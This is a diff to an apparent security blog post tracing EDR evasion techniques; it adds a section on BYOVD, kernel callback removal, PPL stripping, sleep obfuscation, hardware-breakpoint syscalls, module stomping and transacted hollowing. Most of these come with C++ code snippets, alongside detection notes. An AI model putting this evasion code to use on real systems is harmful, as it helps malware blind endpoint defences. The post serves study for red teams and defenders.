@@ -1,4 +1,4 @@
-﻿---
+---
 layout: attack
 title: "The EDR Bypass Roadmap: Technical Evolution and API Subversion"
 ---
@@ -21,12 +21,105 @@ This timeline breaks down the evolution of evasion—from early Windows API abus
 - [Phase 4: The age of Deception - Syscalls \& Stack Integrity (2019–2021)](#phase-4-the-age-of-deception---syscalls--stack-integrity-20192021)
 - [Phase 5: The ETW \& Memory Evasion Era (2020–2022)](#phase-5-the-etw--memory-evasion-era-20202022)
 - [Phase 6: Advanced Injection \& Modern Era (2022–Present / Time of Writing: 2026)](#phase-6-advanced-injection--modern-era-2022present--time-of-writing-2026)
+- [Phase 7: Kernel-Level \& Hardware-Assisted Evasion (2023–2026)](#phase-7-kernel-level--hardware-assisted-evasion-20232026)
+  - [BYOVD — Bring Your Own Vulnerable Driver](#byovd--bring-your-own-vulnerable-driver)
+  - [Kernel Callback Table Manipulation](#kernel-callback-table-manipulation)
+  - [PPL Bypass \& Protected Process Subversion](#ppl-bypass--protected-process-subversion)
+  - [Advanced Sleep Obfuscation](#advanced-sleep-obfuscation)
+  - [Hardware Breakpoint Syscalls](#hardware-breakpoint-syscalls)
+  - [Module Stomping \& Phantom DLL Hollowing](#module-stomping--phantom-dll-hollowing)
 - [Technical Summary \& API Matrix](#technical-summary--api-matrix)
 - [Conclusion](#conclusion)
 
 Overview about the timeline, its phases and related techniques that will be discussed below:
 
 ![](/images/edr_bypass_timeline_chart.png)
+
+<div class="talks-timeline">
+  <div class="timeline-year">
+    <span class="year-badge">2010 – 2015</span>
+    <div class="timeline-events">
+      <div class="timeline-event">
+        <span class="event-icon">🔧</span>
+        <div class="event-content">
+          <strong>Phase 1: The Foundation</strong> — Classic DLL Injection, Process Hollowing, Manual Mapping, Reflective DLL Loading. EDRs lacked memory-write ↔ thread-creation correlation.
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="timeline-year">
+    <span class="year-badge">2015 – 2017</span>
+    <div class="timeline-events">
+      <div class="timeline-event">
+        <span class="event-icon">🪝</span>
+        <div class="event-content">
+          <strong>Phase 2: The Hooking Crusade</strong> — EDRs deploy inline hooks &amp; IAT patches on <code>Nt*</code> APIs. Attackers respond with IAT hook detection and manual ntdll unhooking.
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="timeline-year">
+    <span class="year-badge">2017 – 2019</span>
+    <div class="timeline-events">
+      <div class="timeline-event">
+        <span class="event-icon">⚙️</span>
+        <div class="event-content">
+          <strong>Phase 3: The Syscall Revolution</strong> — Direct syscalls bypass ntdll entirely. Hell's Gate / Halos Gate / Tartarus' Gate enable dynamic SSN resolution. SysWhispers industrializes the technique.
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="timeline-year">
+    <span class="year-badge">2019 – 2021</span>
+    <div class="timeline-events">
+      <div class="timeline-event">
+        <span class="event-icon">🎭</span>
+        <div class="event-content">
+          <strong>Phase 4: The Age of Deception</strong> — EDRs add call-stack analysis. Indirect syscalls via ROP gadgets, return-address spoofing, and stack pivoting restore a legitimate execution context.
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="timeline-year">
+    <span class="year-badge">2020 – 2022</span>
+    <div class="timeline-events">
+      <div class="timeline-event">
+        <span class="event-icon">👁️</span>
+        <div class="event-content">
+          <strong>Phase 5: ETW &amp; Memory Evasion Era</strong> — Defenders shift to ETW telemetry. Attackers blind it via <code>EtwEventWrite</code> patching, AMSI bypass, and session hijacking. ETW-TI (kernel-mode) proves immune.
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="timeline-year">
+    <span class="year-badge">2022 – 2024</span>
+    <div class="timeline-events">
+      <div class="timeline-event">
+        <span class="event-icon">🚀</span>
+        <div class="event-content">
+          <strong>Phase 6: Advanced Injection &amp; Modern Era</strong> — Early Bird &amp; Early Cascade APC injection exploit the pre-hook initialization window. Threadless Injection and Process Ghosting eliminate thread-creation telemetry entirely. Sleep obfuscation (Ekko/Foliage) encrypts beacons at rest.
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="timeline-year">
+    <span class="year-badge">2023 – 2026</span>
+    <div class="timeline-events">
+      <div class="timeline-event">
+        <span class="event-icon">⚡</span>
+        <div class="event-content">
+          <strong>Phase 7: Kernel-Level &amp; Hardware-Assisted Evasion</strong> — BYOVD (Bring Your Own Vulnerable Driver) removes kernel callbacks and strips PPL. Hardware breakpoints (<code>DR0</code>–<code>DR3</code>) dispatch syscalls without touching code bytes. Module Stomping and Phantom DLL Hollowing hide shellcode from VAD scanners. HVCI and the Vulnerable Driver Blocklist are the final defensive frontier.
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
 
 ## Phase 1: The Foundation (2010–2015)
 **Strategy:** Exploiting trust by utilizing legitimate Windows mechanisms for code placement.
@@ -465,6 +558,245 @@ LONG WINAPI MyHandler(PEXCEPTION_POINTERS pExcpt) {
 AddVectoredExceptionHandler(1, MyHandler);
 ```
 
+## Phase 7: Kernel-Level & Hardware-Assisted Evasion (2023–2026)
+**Strategy:** Moving the battlefield from userland to the kernel and hardware layer, where most commercial EDRs have limited or no visibility.
+
+The maturation of ETW-TI, kernel callbacks, and Credential Guard pushed offensive research below the user/kernel boundary. The result is a class of techniques that require a driver—either legitimately signed (BYOVD) or one you've placed yourself—or hardware features (`DR0`–`DR3`) that the OS exposes to unprivileged threads.
+
+### BYOVD — Bring Your Own Vulnerable Driver
+
+**BYOVD ([T1068](https://attack.mitre.org/techniques/T1068/))** exploits a legitimately signed but vulnerable kernel driver to achieve ring-0 execution. The attacker loads the driver, weaponizes its IOCTL interface to execute an arbitrary kernel write or call, and then unloads it to reduce exposure. Notable examples include the exploitation of `gdrv.sys` (Gigabyte), `mhyprot2.sys` (MiHoYo), and `iqvw64e.sys` (Intel).
+
+The primary payloads delivered through the kernel write primitive include:
+- Removing EDR kernel callbacks registered via `PsSetCreateProcessNotifyRoutine`, `PsSetCreateThreadNotifyRoutine`, and `PsSetLoadImageNotifyRoutine`
+- Zeroing the `ActiveProcessLinks` entry in `EPROCESS` to hide a process from the kernel's process list
+- Disabling Protected Process Light (PPL) on an EDR process by clearing the `Protection` field in `EPROCESS`
+
+```cpp
+// Conceptual: Enumerate and unlink EDR callbacks via kernel write primitive
+// (requires a BYOVD primitive that exposes arbitrary kernel read/write)
+
+// 1. Locate PspCreateProcessNotifyRoutine array in ntoskrnl
+ULONG_PTR pCallbackArray = FindKernelExport("PspCreateProcessNotifyRoutine");
+
+// 2. Read each callback pointer
+for (int i = 0; i < 64; i++) {
+    ULONG_PTR cbEntry = KernelRead(pCallbackArray + i * sizeof(ULONG_PTR));
+    if (!cbEntry) continue;
+
+    // 3. Decode ExFastRef pointer (low 4 bits = ref count)
+    ULONG_PTR pCallback = cbEntry & ~0xFULL;
+    
+    // 4. Identify EDR module by matching the callback's code to a known EDR driver
+    // 5. Zero the entry to remove the callback
+    KernelWrite(pCallbackArray + i * sizeof(ULONG_PTR), 0);
+}
+```
+
+> **Detection:** Microsoft's Vulnerable Driver Blocklist (enforced by HVCI/Memory Integrity) maintains a list of known-bad drivers. The [loldrivers.io](https://www.loldrivers.io/) project catalogs abused drivers and is a key reference for detection engineers building hash-based or signer-based blocklists.
+
+### Kernel Callback Table Manipulation
+
+Without a vulnerable driver, attackers with an existing kernel write primitive (e.g., from a CVE or BYOVD stage) can tamper with the Windows kernel's notification routine arrays directly.
+
+- **`PspCreateProcessNotifyRoutine`** — fired for every process creation; EDR uses this to inject its DLL
+- **`PspCreateThreadNotifyRoutine`** — fired for every thread creation
+- **`PspLoadImageNotifyRoutine`** — fired when a PE image is mapped into memory
+
+```cpp
+// Conceptual: Removing a specific EDR callback from the notify routine array
+// Each entry is an ExFastRef-encoded pointer to a EX_CALLBACK_ROUTINE_BLOCK
+
+typedef struct _EX_CALLBACK_ROUTINE_BLOCK {
+    EX_RUNDOWN_REF        RundownProtect;
+    PEX_CALLBACK_FUNCTION Function;       // <-- the actual EDR callback
+    PVOID                 Context;
+} EX_CALLBACK_ROUTINE_BLOCK, *PEX_CALLBACK_ROUTINE_BLOCK;
+
+// Decode and zero the callback for a targeted EDR driver
+void RemoveCallback(ULONG_PTR* pArray, ULONG_PTR targetBase, ULONG_PTR targetEnd) {
+    for (int i = 0; i < 64; i++) {
+        ULONG_PTR encoded = pArray[i];
+        if (!encoded) continue;
+        ULONG_PTR block = encoded & ~0xFULL;
+        ULONG_PTR fn = *(ULONG_PTR*)(block + offsetof(EX_CALLBACK_ROUTINE_BLOCK, Function));
+        if (fn >= targetBase && fn < targetEnd)
+            pArray[i] = 0; // unlinking the callback
+    }
+}
+```
+
+### PPL Bypass & Protected Process Subversion
+
+**Protected Process Light (PPL)** prevents even high-privileged processes from opening EDR processes with `PROCESS_VM_READ`, `PROCESS_TERMINATE`, or similar rights. The protection level is encoded in the `EPROCESS.Protection` byte.
+
+Without kernel access, PPL presents a hard wall. With it, removing PPL from a target process is a single-byte patch:
+
+```cpp
+// Conceptual: PPL removal via kernel write primitive
+// EPROCESS.Protection is a PS_PROTECTION structure at a known offset
+
+typedef struct _PS_PROTECTION {
+    UCHAR Type  : 3;   // PS_PROTECTED_TYPE
+    UCHAR Audit : 1;
+    UCHAR Signer: 4;   // PS_PROTECTED_SIGNER
+} PS_PROTECTION;
+
+// Offset varies by Windows build — must be resolved via PDB or pattern scan
+ULONG_PTR pEPROCESS  = GetKernelEPROCESS(dwEdPID);
+ULONG_PTR pProtection = pEPROCESS + PROTECTION_OFFSET;
+
+// Zero the Protection field to strip PPL
+KernelWrite8(pProtection, 0x00);
+
+// Now OpenProcess with PROCESS_ALL_ACCESS succeeds against the former PPL process
+```
+
+Notable public implementations: `PPLKiller`, `PPLFault` (CVE-based, no driver required), and `NtFakeProtection` research.
+
+### Advanced Sleep Obfuscation
+
+**Sleep obfuscation** ([T1055](https://attack.mitre.org/techniques/T1055/)) solves the problem of memory-scanning EDRs detecting shellcode beacons while they sleep. Instead of leaving the payload readable in `RWX` memory, the implant encrypts itself before sleeping and decrypts on wake.
+
+**Ekko** (Cracked5pider, 2022) pioneered the technique using ROP chains + `CreateTimerQueueTimer` to defer execution of a decryption stub:
+
+```cpp
+// Ekko-style sleep obfuscation - ROP chain via NtContinue
+// Key insight: build a fake CONTEXT for each step, execute via NtContinue
+
+void ObfuscatedSleep(DWORD dwMilliseconds, PVOID pPayload, SIZE_T payloadSize, BYTE* key) {
+    // 1. Locate a RtlCaptureContext gadget and NtContinue in ntdll
+    // 2. Build a chain of CONTEXT structures:
+    //    ctx[0] -> VirtualProtect(payload, RW)
+    //    ctx[1] -> SystemFunction032(payload, key)  // RC4 encrypt
+    //    ctx[2] -> WaitForSingleObject(hTimer, timeout)
+    //    ctx[3] -> SystemFunction032(payload, key)  // RC4 decrypt
+    //    ctx[4] -> VirtualProtect(payload, RX)
+    //    ctx[5] -> SetEvent / return
+
+    // 3. Queue a kernel timer that fires NtContinue into ctx[0]
+    //    The payload is encrypted (non-executable) during the entire sleep window
+    CreateTimerQueueTimer(&hTimerObj, NULL,
+        (WAITORTIMERCALLBACK)pNtContinue, &ctx[0],
+        0, 0, WT_EXECUTEINTIMERTHREAD);
+
+    WaitForSingleObject(hEvent, INFINITE);
+}
+```
+
+**Foliage** and **Cronos** extended this concept with stack spoofing during sleep so the sleeping thread's call stack shows only legitimate frames.
+
+> **Detection:** EDRs counter sleep obfuscation with periodic memory scanning at fixed intervals, `MmSecureVirtualMemory` monitoring, and entropy analysis of `RX`→`RW`→`RX` permission transitions on the same region.
+
+### Hardware Breakpoint Syscalls
+
+**Hardware breakpoints** use the CPU's debug registers (`DR0`–`DR3`) to set execution breakpoints without modifying any code bytes. Because the breakpoints live in CPU registers rather than memory, byte-comparison unhooking detection cannot see them.
+
+The technique registers a **VEH handler** and arms a `DR` register on a target address (e.g., the syscall stub of `NtAllocateVirtualMemory`). When execution hits that address, the CPU fires `EXCEPTION_SINGLE_STEP`, the VEH handler intercepts it, redirects `RIP` to a clean syscall gadget, and sets the correct SSN—bypassing any inline hook the EDR placed on the stub.
+
+```cpp
+// Hardware breakpoint syscall execution via DR0 + VEH
+LONG NTAPI HwBpHandler(PEXCEPTION_POINTERS pExcpt) {
+    if (pExcpt->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
+        return EXCEPTION_CONTINUE_SEARCH;
+
+    PCONTEXT ctx = pExcpt->ContextRecord;
+
+    // Check if we triggered on our patched address
+    if (ctx->Dr6 & 0x1) {           // DR0 hit
+        ctx->Rax = g_SSN;           // Inject the syscall service number
+        ctx->Rip = g_SyscallGadget; // Redirect to 'syscall; ret' in ntdll
+        ctx->Dr0 = 0;               // Disarm breakpoint
+        ctx->Dr7 &= ~0x1;
+        return EXCEPTION_CONTINUE_EXECUTION;
+    }
+    return EXCEPTION_CONTINUE_SEARCH;
+}
+
+void ArmHardwareBreakpoint(PVOID pTarget, DWORD ssn, PVOID pGadget) {
+    g_SSN = ssn;
+    g_SyscallGadget = pGadget;
+
+    CONTEXT ctx = {};
+    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+    GetThreadContext(GetCurrentThread(), &ctx);
+
+    ctx.Dr0 = (DWORD64)pTarget; // Set breakpoint address
+    ctx.Dr7 |= 0x1;             // Enable DR0 (local, execute)
+    SetThreadContext(GetCurrentThread(), &ctx);
+
+    AddVectoredExceptionHandler(1, HwBpHandler);
+}
+```
+
+This technique is used in **RecycledGate**, **TartarusGate** derivatives, and various modern C2 BOFs (Beacon Object Files).
+
+### Module Stomping & Phantom DLL Hollowing
+
+**Module Stomping ([T1055.013](https://attack.mitre.org/techniques/T1055/013/))** writes shellcode over a legitimate, already-loaded module's `RX` section. Because the VAD (Virtual Address Descriptor) entry still reports the region as backed by a legitimate file, memory-scan heuristics that flag private `RX` regions miss it entirely.
+
+```cpp
+// Module Stomping: overwrite a low-risk DLL's .text section with shellcode
+void ModuleStomping(LPCWSTR szTargetDll, PVOID pShellcode, SIZE_T shellcodeSize) {
+    // Load a benign, rarely-inspected DLL as the stomp target
+    HMODULE hTarget = LoadLibraryW(szTargetDll); // e.g., L"xpsservices.dll"
+    
+    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hTarget;
+    PIMAGE_NT_HEADERS pNt  = (PIMAGE_NT_HEADERS)((BYTE*)hTarget + pDos->e_lfanew);
+    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
+    
+    // Find the .text section
+    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++, pSec++) {
+        if (memcmp(pSec->Name, ".text", 5) == 0) {
+            PVOID pTextBase = (BYTE*)hTarget + pSec->VirtualAddress;
+            DWORD oldProt;
+            VirtualProtect(pTextBase, shellcodeSize, PAGE_EXECUTE_READWRITE, &oldProt);
+            memcpy(pTextBase, pShellcode, shellcodeSize);
+            VirtualProtect(pTextBase, shellcodeSize, PAGE_EXECUTE_READ, &oldProt);
+            
+            // Transfer execution into the stomped region
+            ((void(*)())pTextBase)();
+            break;
+        }
+    }
+}
+```
+
+**Phantom DLL Hollowing** (or *Transacted Hollowing*) refines this further: a Windows transaction (`NtCreateTransaction`) is used to write a malicious PE image to a file, creating a section from it, then rolling back the transaction. The file on disk reverts to clean but the in-memory section retains the malicious image—evading file-based scanners while still looking like a file-backed mapping to the VAD.
+
+```cpp
+// Transacted Hollowing — create a file-backed section backed by malicious content
+// without leaving the payload on disk after the transaction is rolled back
+HANDLE hTx = NULL;
+NtCreateTransaction(&hTx, TRANSACTION_ALL_ACCESS, NULL, NULL, NULL, 0, 0, 0, NULL, NULL);
+
+HANDLE hFile = CreateFileTransactedW(
+    L"C:\\Windows\\Temp\\legit.dll",
+    GENERIC_WRITE | GENERIC_READ,
+    0, NULL, CREATE_ALWAYS,
+    FILE_ATTRIBUTE_NORMAL, NULL, hTx, NULL, NULL);
+
+WriteFile(hFile, pMaliciousPE, dwPESize, &dwWritten, NULL);
+
+// Create section from the transacted (not-yet-committed) file
+HANDLE hSection = NULL;
+NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL,
+    NULL, PAGE_READONLY, SEC_IMAGE, hFile);
+
+// Roll back transaction — file on disk is clean again
+NtRollbackTransaction(hTx, TRUE);
+
+// Section is still valid and backed by the malicious image in memory
+PVOID pBase = NULL;
+SIZE_T viewSize = 0;
+NtMapViewOfSection(hSection, GetCurrentProcess(), &pBase,
+    0, 0, NULL, &viewSize, ViewShare, 0, PAGE_EXECUTE_WRITECOPY);
+```
+
+> **Detection:** Defenders counter these techniques by comparing the hash of in-memory `.text` sections against the on-disk module (scan-on-load or periodic), monitoring transacted file operations (`TransactionManager` ETW channel), and flagging sections whose backing file no longer exists on disk.
+
+---
+
 ## Technical Summary & API Matrix
 
 | Phase | Technique | API Cross-Reference | MITRE TID |
@@ -487,15 +819,21 @@ AddVectoredExceptionHandler(1, MyHandler);
 | **Modern** | VEH Execution | `AddVectoredExceptionHandler` | [T1562.001](https://attack.mitre.org/techniques/T1562/001/) |
 | **Modern** | Module Stomping | Memory overwrite in loaded modules | [T1055.013](https://attack.mitre.org/techniques/T1055/013/) |
 | **Modern** | Sleep Obfuscation | Memory encryption during sleep | [T1055](https://attack.mitre.org/techniques/T1055/) |
+| **Kernel** | BYOVD | Vulnerable signed driver + IOCTL exploit | [T1068](https://attack.mitre.org/techniques/T1068/) |
+| **Kernel** | Callback Table Manipulation | `PspCreateProcessNotifyRoutine` zeroing | [T1562.001](https://attack.mitre.org/techniques/T1562/001/) |
+| **Kernel** | PPL Bypass | `EPROCESS.Protection` patch | [T1562.001](https://attack.mitre.org/techniques/T1562/001/) |
+| **Kernel** | Hardware Breakpoint Syscall | `DR0`–`DR3` + VEH interception | [T1106](https://attack.mitre.org/techniques/T1106/) |
+| **Kernel** | Phantom DLL Hollowing | `NtCreateTransaction`, `NtRollbackTransaction` | [T1055.013](https://attack.mitre.org/techniques/T1055/013/) |
+| **Kernel** | Transacted Hollowing | Transacted file-backed section mapping | [T1055.012](https://attack.mitre.org/techniques/T1055/012/) |
 
 
 ## Conclusion
 EDR bypass research has consistently demonstrated one truth: **visibility gaps define opportunity**. As detection shifts from APIs to behavior, and from userland to kernel and hardware, attackers adapt by abusing trust, context, and execution semantics.
 
-This timeline illustrates a clear pattern: each defensive innovation creates new constraints that offensive research systematically defeats. From Stephen Fewer's [Reflective DLL Injection](https://github.com/stephenfewer/ReflectiveDLLInjection) ([T1055.001](https://attack.mitre.org/techniques/T1055/001/)) to Jackson_T's [SysWhispers](https://github.com/jthuraisamy/SysWhispers) ([T1106](https://attack.mitre.org/techniques/T1106/)), the community has consistently pushed the boundaries of what's detectable.
+This timeline illustrates a clear pattern: each defensive innovation creates new constraints that offensive research systematically defeats. From Stephen Fewer's [Reflective DLL Injection](https://github.com/stephenfewer/ReflectiveDLLInjection) ([T1055.001](https://attack.mitre.org/techniques/T1055/001/)) to Jackson_T's [SysWhispers](https://github.com/jthuraisamy/SysWhispers) ([T1106](https://attack.mitre.org/techniques/T1106/)), to BYOVD campaigns exploiting `mhyprot2.sys` at scale, the community has consistently pushed the boundaries of what's detectable.
 
-Modern techniques like [Ekko](https://github.com/Cracked5pider/Ekko) sleep obfuscation, [ThreadStackSpoofer](https://github.com/mgeeky/ThreadStackSpoofer) ([T1562.001](https://attack.mitre.org/techniques/T1562/001/)), and [module stomping](https://offensivedefence.co.uk/posts/module-stomping/) ([T1055.013](https://attack.mitre.org/techniques/T1055/013/)) represent the convergence of these techniques—combining memory manipulation, execution context spoofing, and ETW evasion into cohesive chains.
+Modern techniques like [Ekko](https://github.com/Cracked5pider/Ekko) sleep obfuscation, [ThreadStackSpoofer](https://github.com/mgeeky/ThreadStackSpoofer) ([T1562.001](https://attack.mitre.org/techniques/T1562/001/)), and [module stomping](https://offensivedefence.co.uk/posts/module-stomping/) ([T1055.013](https://attack.mitre.org/techniques/T1055/013/)) represent the convergence of userland techniques—combining memory manipulation, execution context spoofing, and ETW evasion into cohesive chains. But Phase 7 represents a category shift: once an attacker achieves kernel execution via BYOVD, the EDR's userland and most kernel telemetry becomes irrelevant. The only reliable countermeasure at that tier is **HVCI (Hypervisor-Protected Code Integrity)**, which enforces that only WHQL-signed code runs in the kernel, and the **Vulnerable Driver Blocklist** maintained by Microsoft.
 
-As detailed in my research on [Windows APIs](https://benjitrapp.github.io/attacks/2024-06-07-red-windows-api/) and [ETW internals](https://benjitrapp.github.io/defenses/2024-02-11-etw/), the battlefield has moved beyond simple API hooking. The [EDR Hook Detection Scanner](https://benjitrapp.github.io/attacks/2026-06-19-edr-hook-detection/) shows exactly which functions your EDR monitors at the user-mode level, while the [ETW-TI Deep Dive](https://benjitrapp.github.io/defenses/2026-06-19-etw-ti/) reveals what the kernel sees regardless of user-mode evasion. Projects like [EDR Telemetry](https://www.edr-telemetry.com/) are pushing vendors toward kernel-level instrumentation and behavioral analytics, while offensive research continues to explore [direct system calls](https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/), [hardware-based evasion](https://connormcgarr.github.io/hvci/), and [VBS/HVCI bypasses](https://blog.xpnsec.com/windows-warbird-privesc/).
+As detailed in my research on [Windows APIs](https://benjitrapp.github.io/attacks/2024-06-07-red-windows-api/) and [ETW internals](https://benjitrapp.github.io/defenses/2024-02-11-etw/), the battlefield has moved far beyond simple API hooking. The [EDR Hook Detection Scanner](https://benjitrapp.github.io/attacks/2026-06-19-edr-hook-detection/) shows exactly which functions your EDR monitors at the user-mode level, while the [ETW-TI Deep Dive](https://benjitrapp.github.io/defenses/2026-06-19-etw-ti/) reveals what the kernel sees regardless of user-mode evasion—and where even kernel-mode evasion reaches its limit. Projects like [EDR Telemetry](https://www.edr-telemetry.com/) and [loldrivers.io](https://www.loldrivers.io/) are the community's response to Phase 7: systematic cataloging of what each product sees (and misses) at each layer of the stack.
 
 Understanding this evolution—grounded in Windows internals and telemetry design—is essential for both red teams and defenders navigating the modern endpoint arms race. The [MITRE ATT&CK framework](https://attack.mitre.org/) provides structure, but the techniques themselves evolve faster than taxonomies can capture them.
